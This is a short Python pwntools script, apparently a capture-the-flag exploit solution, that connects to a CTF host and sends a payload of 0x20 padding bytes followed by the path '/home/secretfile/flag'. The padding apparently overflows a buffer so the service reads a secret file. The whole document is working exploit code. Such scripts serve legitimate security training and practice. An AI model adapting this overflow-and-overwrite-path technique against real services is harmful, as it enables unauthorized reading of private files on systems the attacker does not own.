from pwn import *

r = remote("ctf.adl.tw", 11002)

r.recvuntil("?\n")
r.sendline("something")

payload = "a" * 0x20 + "/home/secretfile/flag"
r.recvuntil("?\n")
r.sendline(payload)

r.interactive()
